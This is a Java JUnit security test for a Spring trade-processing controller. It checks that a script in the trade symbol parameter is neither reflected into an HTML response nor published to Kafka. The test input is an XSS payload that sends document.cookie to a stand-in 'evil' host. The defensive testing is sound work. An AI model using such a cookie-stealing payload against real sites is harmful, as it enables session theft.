package com.Himanshu.TradesPostProcessingSystem.swarm;

import com.Himanshu.TradesPostProcessingSystem.controller.TradeController;
import com.Himanshu.TradesPostProcessingSystem.model.Trade;
import com.Himanshu.TradesPostProcessingSystem.service.TradeService;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.springframework.http.MediaType;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;

/** INJECT-1: a crafted GET link must not reflect script into an HTML response or book a trade with a markup symbol. */
@Tag("swarm")
class Inject1SwarmTest {

    @Test
    @SuppressWarnings("unchecked")
    void scriptInSymbolIsNotReflectedAsHtmlNorPublished() throws Exception {
        KafkaTemplate<String, Trade> kafka = mock(KafkaTemplate.class);
        TradeService service = new TradeService();
        ReflectionTestUtils.setField(service, "kafkaTemplate", kafka);
        TradeController controller = new TradeController();
        ReflectionTestUtils.setField(controller, "tradeService", service);
        MockMvc mvc = MockMvcBuilders.standaloneSetup(controller).build();

        MvcResult result = mvc.perform(get("/api/trade/sendTrade")
                        .accept(MediaType.TEXT_HTML)
                        .param("symbol", "<script>fetch('//evil/'+document.cookie)</script>")
                        .param("quantity", "1")
                        .param("price", "1"))
                .andReturn();

        String body = result.getResponse().getContentAsString();
        String type = String.valueOf(result.getResponse().getContentType());
        assertFalse(type.startsWith("text/html") && body.contains("<script>"),
                "attacker script reflected in " + type + " response: " + body);
        verify(kafka, never()).send(anyString(), anyString(), any(Trade.class));
    }
}
